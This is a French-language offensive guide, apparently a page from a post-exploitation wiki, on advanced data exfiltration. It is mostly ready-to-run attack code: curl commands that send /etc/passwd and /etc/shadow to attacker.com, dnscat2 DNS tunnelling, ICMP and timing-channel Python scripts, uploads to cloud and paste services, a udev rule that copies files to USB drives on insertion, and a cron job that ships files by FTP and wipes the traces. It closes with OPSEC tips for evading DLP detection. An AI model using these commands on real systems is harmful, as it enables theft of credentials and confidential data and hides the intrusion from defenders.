# Techniques Avanc√©es d'Exfiltration de Donn√©es

## üóÇÔ∏è Workflow d'exfiltration avanc√©e
1. Classification et identification des donn√©es cibles
   ‚Üì
2. Choix du canal d'exfiltration (r√©seau, physique, covert)
   ‚Üì
3. Pr√©paration des donn√©es (compression, chiffrement, fragmentation)
   ‚Üì
4. Mise en place de l'infrastructure d'exfiltration
   ‚Üì
5. Ex√©cution de l'exfiltration avec monitoring
   ‚Üì
6. Validation de l'int√©grit√© et nettoyage des traces

## üìã Vue d'ensemble

L'exfiltration avanc√©e de donn√©es combine techniques de collecte, manipulation et transmission pour extraire des informations sensibles tout en √©vitant la d√©tection par les syst√®mes de s√©curit√©.

> **üí° Explication Simple** : C'est comme faire sortir des documents secrets d'une entreprise en les cachant dans diff√©rents supports (courrier, USB, transmission radio) pour √©viter les contr√¥les de s√©curit√©.

## üìä Classification et Identification des Donn√©es

### Types de donn√©es cibles
```bash
# Documents sensibles
find / -name "*.doc*" -o -name "*.pdf" -o -name "*.xls*" 2>/dev/null | head -20
find / -name "*confidential*" -o -name "*secret*" -o -name "*password*" 2>/dev/null

# Bases de donn√©es
find / -name "*.db" -o -name "*.sqlite" -o -name "*.mdb" 2>/dev/null
locate "*.sql" 2>/dev/null

# Fichiers de configuration
find /etc -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null
```

### Estimation de volume
```bash
# Calcul taille totale √† exfiltrer
find /path/to/target -type f -exec du -b {} \; | awk '{sum+=$1} END {print "Total: " sum/1024/1024 " MB"}'

# Analyse par type de fichier
find /path/to/target -name "*.pdf" -exec du -ch {} \; | tail -1
find /path/to/target -name "*.doc*" -exec du -ch {} \; | tail -1
```

## üåê Canaux d'Exfiltration R√©seau

### HTTP/HTTPS Covert Channels
```bash
# Exfiltration via User-Agent
curl -H "User-Agent: $(base64 -w0 /etc/passwd)" http://attacker.com/collect

# Exfiltration via param√®tres GET
data=$(base64 -w0 /etc/shadow | tr '/' '_' | tr '+' '-')
curl "http://attacker.com/search?q=$data"

# Exfiltration via POST multipart
curl -F "file=@/etc/passwd" -F "type=backup" http://attacker.com/upload
```

### DNS Tunneling
```bash
# Installation dnscat2 (serveur attaquant)
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server && ruby dnscat2.rb attacker.com

# Client (machine compromise)
./dnscat2-client attacker.com

# Transfert de fichier via DNS
# (depuis session dnscat2)
download /etc/passwd
upload malware.exe
```

### ICMP Tunneling
```bash
# Avec ptunnel (serveur attaquant)
ptunnel -p proxy.attacker.com -lp 8000 -da target-machine -dp 22

# Exfiltration via ping custom
# Script Python pour exfiltration ICMP
python3 << 'EOF'
import subprocess
import base64

def exfil_icmp(data, target_ip):
    encoded = base64.b64encode(data.encode()).decode()
    # Fragment en chunks de 32 bytes (limite ICMP)
    chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
    
    for i, chunk in enumerate(chunks):
        cmd = f"ping -c 1 -p {chunk.encode().hex()} {target_ip}"
        subprocess.run(cmd.split(), capture_output=True)

with open('/etc/passwd', 'r') as f:
    data = f.read()
    exfil_icmp(data, "attacker.com")
EOF
```

## üì± Canaux Covert Alternatifs

### Steganographie
```bash
# Cacher donn√©es dans image (steghide)
steghide embed -cf image.jpg -ef secret.txt -p password123

# Extraction
steghide extract -sf image.jpg -p password123

# LSB steganography avec stegsolve
java -jar stegsolve.jar

# Outguess pour JPEG
outguess -d image.jpg secret.txt
```

### Blockchain et Crypto
```bash
# Exfiltration via Bitcoin transactions
# Script Python utilisant bitcoin library
python3 << 'EOF'
from bitcoin import *
import binascii

# Donn√©es √† exfiltrer (limit√©es par taille transaction)
data = "sensitive_data_here"
hex_data = binascii.hexlify(data.encode()).decode()

# Cr√©er transaction avec data dans OP_RETURN
priv_key = random_key()
pub_key = privtopub(priv_key)
addr = pubtoaddr(pub_key)

# Transaction avec OP_RETURN (max 80 bytes)
print(f"Embed in OP_RETURN: {hex_data[:160]}")  # 80 bytes en hex
EOF
```

### Services Cloud L√©gitimes
```bash
# Google Drive via API
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
     -F "metadata={name:'backup.txt'};type=application/json;charset=UTF-8" \
     -F "file=@/etc/passwd;type=text/plain" \
     "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"

# Pastebin-like services
curl -d "content=$(cat /etc/passwd)" -d "expiry=1hour" https://pastebin.com/api/paste

# GitHub Gists
curl -H "Authorization: token $GITHUB_TOKEN" \
     -d '{"files":{"backup.txt":{"content":"'$(cat /etc/passwd | base64 -w0)'"}}}' \
     https://api.github.com/gists
```

## üíæ Exfiltration Physique

### USB et Supports Amovibles
```bash
# D√©tection supports USB
lsblk | grep usb
dmesg | grep -i usb

# Copie automatique sur insertion USB
cat > /etc/udev/rules.d/99-usb-exfil.rules << 'EOF'
ACTION=="add", SUBSYSTEMS=="usb", RUN+="/usr/local/bin/usb-exfil.sh %k"
EOF

# Script d'exfiltration USB
cat > /usr/local/bin/usb-exfil.sh << 'EOF'
#!/bin/bash
DEVICE="/dev/$1"
MOUNT_POINT="/mnt/usb-exfil"

mkdir -p $MOUNT_POINT
mount $DEVICE $MOUNT_POINT

if [ -d $MOUNT_POINT ]; then
    cp -r /home/sensitive_data $MOUNT_POINT/backup_$(date +%Y%m%d)
    sync
    umount $MOUNT_POINT
fi
EOF
chmod +x /usr/local/bin/usb-exfil.sh
```

### CD/DVD Burning
```bash
# Gravure de donn√©es sensibles
mkisofs -o /tmp/backup.iso /path/to/sensitive/data
cdrecord -v dev=/dev/sr0 /tmp/backup.iso

# Avec encryption
tar czf - /path/to/data | gpg -c --cipher-algo AES256 | dd of=/dev/sr0
```

## üîÑ Techniques de Preparation

### Compression et Archive
```bash
# Compression maximale
tar -czf backup.tar.gz /etc/passwd /etc/shadow /etc/group
7z a -mx9 -p"password123" backup.7z /home/user/Documents/

# Split en petits fichiers
split -b 1M backup.tar.gz backup_part_
```

### Chiffrement et Obfuscation
```bash
# Chiffrement AES
openssl enc -aes-256-cbc -salt -in data.txt -out data.enc -k "password123"

# Chiffrement avec GPG
gpg --symmetric --cipher-algo AES256 data.txt

# Obfuscation simple
base64 -w0 data.txt > data.b64
rev data.txt > data.rev  # Reverse content
```

### Fragmentation et Reassemblage
```bash
# Fragmentation intelligente
python3 << 'EOF'
import os

def fragment_file(filename, max_size=1024*1024):  # 1MB chunks
    with open(filename, 'rb') as f:
        data = f.read()
    
    chunks = []
    for i in range(0, len(data), max_size):
        chunk = data[i:i+max_size]
        chunk_name = f"{filename}.part{i//max_size:03d}"
        
        with open(chunk_name, 'wb') as cf:
            cf.write(chunk)
        chunks.append(chunk_name)
    
    # Cr√©er script de reassemblage
    with open(f"{filename}.reassemble.sh", 'w') as rs:
        rs.write(f"#!/bin/bash\ncat {' '.join(chunks)} > {filename}.restored\n")
    
    return chunks

fragments = fragment_file('/etc/passwd')
print(f"Created {len(fragments)} fragments")
EOF
```

## üïê Exfiltration Temporelle

### Timing-based Exfiltration
```bash
# Exfiltration via timing de ping
python3 << 'EOF'
import subprocess
import time
import binascii

def exfil_timing(data, target):
    # Convert data to binary
    binary_data = ''.join(format(ord(c), '08b') for c in data)
    
    for bit in binary_data:
        if bit == '1':
            time.sleep(2)  # Long delay = 1
        else:
            time.sleep(1)  # Short delay = 0
        
        # Send ping as timing marker
        subprocess.run(['ping', '-c', '1', target], 
                      capture_output=True, timeout=5)

# Usage
exfil_timing("secret", "attacker.com")
EOF
```

### Scheduled Exfiltration
```bash
# Crontab pour exfiltration p√©riodique
(crontab -l; echo "0 2 * * * /usr/local/bin/exfil-routine.sh") | crontab -

# Script d'exfiltration routini√®re
cat > /usr/local/bin/exfil-routine.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y%m%d)
BACKUP_DIR="/tmp/.backup_$DATE"

mkdir -p $BACKUP_DIR
find /home -name "*.doc*" -o -name "*.pdf" | head -10 | xargs -I {} cp {} $BACKUP_DIR/

tar czf /tmp/daily_backup_$DATE.tar.gz $BACKUP_DIR
curl -T /tmp/daily_backup_$DATE.tar.gz ftp://backup:password@attacker.com/

rm -rf $BACKUP_DIR /tmp/daily_backup_$DATE.tar.gz
EOF
chmod +x /usr/local/bin/exfil-routine.sh
```

## üõ°Ô∏è Conseils OPSEC
- √âviter les canaux d'exfiltration √©vidents (FTP, email direct)
- Fragmenter les donn√©es pour √©viter la d√©tection DLP
- Utiliser des services l√©gitimes comme couverture
- Chiffrer syst√©matiquement les donn√©es exfiltr√©es
- Impl√©menter des d√©lais al√©atoires pour √©viter la d√©tection pattern

## ‚ö†Ô∏è Erreurs fr√©quentes
- Exfiltrer des volumes trop importants d'un coup (d√©tectable)
- Utiliser des canaux non-chiffr√©s (interception possible)
- Oublier de nettoyer les traces locales apr√®s exfiltration
- Ne pas tester l'int√©grit√© des donn√©es exfiltr√©es
- Ignorer les syst√®mes DLP (Data Loss Prevention) en place

## üí° Astuces
- Combiner plusieurs canaux pour la redondance
- Utiliser la steganographie pour cacher dans du contenu l√©gitime
- Impl√©menter des m√©canismes de retry automatique
- Cr√©er des leurres (fake data) pour confondre la d√©tection
- Utiliser les p√©riodes de forte activit√© r√©seau pour se camoufler

## üîó Pour aller plus loin
- [PayloadsAllTheThings - Data Exfiltration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Data%20Exfiltration)
- [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)
- [MITRE ATT&CK - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [DNScat2](https://github.com/iagox86/dnscat2)
- [Steghide](http://steghide.sourceforge.net/)

## üß≠ Navigation
- [Guide Backdoors](../Persistance/Backdoors.md)
- [Guide Lateral Movement](../Persistance/Lateral_Movement.md)
- [Retour √† la post-exploitation](./README.md) 